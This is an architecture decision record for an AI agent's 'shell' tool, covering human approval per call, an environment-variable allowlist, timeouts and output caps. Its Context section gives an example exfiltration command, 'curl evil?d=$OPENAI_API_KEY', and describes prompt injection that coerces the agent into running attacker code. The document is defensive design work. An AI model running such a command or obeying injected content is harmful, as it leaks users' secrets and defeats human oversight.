# ADR 0005 — `shell`: command execution (high-risk; HITL is the boundary, not a sandbox yet)

- **Status:** Accepted
- **Date:** 2026-07-25
- **Deciders:** @zq940222
- **Related:** [P14 — #39](https://github.com/zq940222/super-agent/issues/39), [ADR-0004](0004-capable-tools.md), `docs/agent-research.md` (§3.3 Codex OS-kernel sandbox, §3.4 OpenClaw sandbox/tool-policy/elevated, §4 checklist #4 "few sharp tools + code execution", line 339 "B 起步")

## Context

`shell` is the single biggest capability lever in the arc (research checklist #4: "few sharp
tools + **code execution**") — and the most dangerous tool the agent will ever hold. Arbitrary
command execution is *both* legs of the lethal trifecta at once: a command is arbitrary
**inbound** execution (a model coerced by injected content runs attacker code) and an arbitrary
**outbound** channel (`curl evil?d=$OPENAI_API_KEY`). Unlike `web_fetch`/`web_search` (fixed or
scheme-guarded endpoints), there is no boundary to draw *inside* the tool — the command is the
payload.

The references map the design space:
- **Codex** — OS-kernel sandbox (Seatbelt / `bwrap`+seccomp), *sandbox ⊥ approval* as two
  orthogonal layers, `.git` read-only even in a writable root, and an **execpolicy allowlist +
  session amendments** (approve a command *pattern*, future matches skip the prompt).
- **OpenClaw** — three orthogonal layers: sandbox / tool-policy (*deny always wins*) / a narrow
  `exec` elevation escape hatch.
- **Our research's own steer** (§339): *start with the permission layer*; shelling out to
  `bwrap`/containers from TS/Node is an **advanced** step, not v1.

This ADR records the v1 shape and the cross-cutting safety decisions. **The honest v1 posture:
the security boundary is the human approval, not a sandbox.** Everything else (env-scrub, cwd
default, timeout, output cap) is blast-radius reduction, not containment.

## Decision

### 1. Shape: `shell({ command, timeout_ms? })` → `sh -c`, non-interactive

One tool, `shell`, runs `command` through a real shell (`sh -c`) via `Bun.spawn`, so pipes,
globs, and redirects work — that *is* the point of a shell tool; argv-only exec is a different,
narrower tool. It's **non-interactive**: stdin is closed, no TTY. Interactive programs (`vim`,
prompts) aren't supported and will hang until the timeout (§5) kills them.

### 2. `risk: "high"`, `mutates: true`

Under the existing gate (permissions/gate.ts) that means: `default` → **ask** every time,
`readonly` → **deny**, `auto` → allow (trusted/sandboxed contexts only). No engine change; the
tool inherits the model. `mutates: true` is semantically honest (it can write/delete anything);
at `high` risk it has no extra gate effect (readonly denies non-low regardless), but it keeps the
flag meaningful.

### 3. High-risk is **always per-call**: `allowForSession` refuses it

The web/TUI "Always allow" writes a session allow-rule (`policy.allowForSession(name)`). For
`shell` that is a **consent mismatch**: the click answers "is `ls` OK?", not "run every future
command unprompted" — one click would silently convert the session to Codex's
`danger-full-access`. So `allowForSession(name, risk)` gains the risk and **refuses to persist a
`high`-risk allow**; the current call is still approved, it just doesn't grant a standing rule.

This is *not* the same as blocking a deliberate operator escape hatch: construction-time
`PermissionPolicy({ allow: ["shell"] })` and `auto` mode still pre-authorize (that's an
informed, up-front choice, like `auto`). We block only the *runtime one-click* escalation. This
changes behavior for **zero** existing tools — none are `high` today, `shell` is the first.

The principled generalization — Codex-style **command-level execpolicy/amendments** (approve a
command *pattern*, future matches skip the prompt) — is deferred; it's its own phase.

### 4. cwd defaults to the workspace — a default, **not** a boundary

`shell` runs with `cwd = ctx.workspaceRoot ?? ctx.cwd`, matching `resolveInWorkspace`'s
fallback (tools/workspace.ts), so in the real app commands start in the same dedicated workspace
the file tools are confined to — no repeat of the #37 source-pollution bug. But this is only the
*starting* directory: `cd /`, absolute paths, and `..` all escape it. Unlike the file tools
(which reject escaping paths), a shell command cannot be path-confined without a sandbox. We
label it a default, not a security boundary — the boundary is §3's approval.

### 5. Timeout + kill (verified against Bun 1.3.13)

Every command runs under a wall-clock timeout (default 30s, caller may lower via `timeout_ms`,
bounded to a hard max) using `Bun.spawn`'s native `timeout` + `killSignal: "SIGKILL"`. Verified:
a `sleep 5` under a 300ms timeout is killed at ~302ms with `exitCode: null`,
`signalCode: "SIGKILL"`, `killed: true` — so a timed-out run is reported as killed-by-signal, not
a clean exit. **Accepted/deferred:** `sh -c` grandchildren aren't process-group-killed, so a
timed-out pipeline can orphan children; process-group kill (`detached` + negative-pgid) is a
later refinement.

### 6. Environment: an allowlist (fail closed), not a denylist

The child gets an **explicit allowlist** of env vars — `PATH`, `HOME`, `LANG`, `TERM`, `TMPDIR`,
`SHELL`, `USER` — plus anything the user opts in via config. It does **not** inherit the agent's
process env, so `OPENAI_API_KEY` / `ANTHROPIC_API_KEY` / `BRAVE_API_KEY` can't be read and
exfiltrated by a command. A denylist (`/KEY|TOKEN|SECRET/i`) was rejected: it misses `AWS_SESSION_*`,
`GH_*`, `ANTHROPIC_AUTH`, and any key added later — and a denylist that misses one key *reads* as
protection while providing none (fails open). The allowlist fails closed; commands that need a
var (`NODE_ENV`, a proxy) error visibly and the user adds it to the opt-in list — a visible
failure, not a silent leak.

### 7. Output-size discipline (ADR-0004 §4)

Capture stdout + stderr, cap the returned text with the visible `…[truncated N of M chars]`
marker, and always report the **exit code** (and signal, when killed). Silent truncation would
let the model believe it saw the whole output.

### 8. The tool description steers the model

`shell`'s description must state the three surprises up front: commands run **non-interactively**,
**in the workspace directory**, with a **scrubbed environment**. Otherwise the model writes
`npm install` expecting inherited proxy/registry config and gets confusing failures it can't
diagnose.

## Consequences

**Positive**
- The capability jump the research calls the biggest lever, gated by the existing permission model.
- Real, cheap blast-radius reduction (env allowlist, cwd default, timeout, output cap) without a
  sandbox dependency — all unit-testable with an injected spawn, zero real process risk in CI.
- The `allowForSession` fix makes "Always allow" safe to keep offering uniformly; `shell` simply
  never persists.

**Negative / accepted**
- **No containment.** A user who approves a malicious command runs it — the boundary is their
  judgement. That's the honest v1 posture, documented, not hidden.
- Orphaned grandchildren on timeout (§5).
- The env allowlist breaks commands needing extra vars until the user opts them in (§6).
- No command-level execpolicy yet, so `shell` prompts on *every* call under `default` (§3).

## Alternatives considered

- **OS-kernel sandbox in v1** (Seatbelt / `bwrap` / seccomp). Rejected per §339: it needs an
  external process or a Rust rewrite and is a phase of its own; the permission layer + HITL is the
  right starting rung. Recorded as the top upgrade path.
- **Denylist env-scrub.** Rejected — fails open (§6).
- **Blocking allow-rules in `decide()` for `high`.** Rejected: a one-liner, but it also neuters a
  deliberate construction-time `allow: ["shell"]`; we want to block only the runtime one-click, so
  the refusal lives in `allowForSession` (§3).
- **Command-level allowlist / execpolicy in v1.** Rejected for scope — the principled future fix,
  but its own phase; v1 is per-call approval.
- **argv-only exec (no shell).** Rejected: no pipes/globs/redirects defeats the purpose; `sh -c`
  with HITL approval is the honest v1.
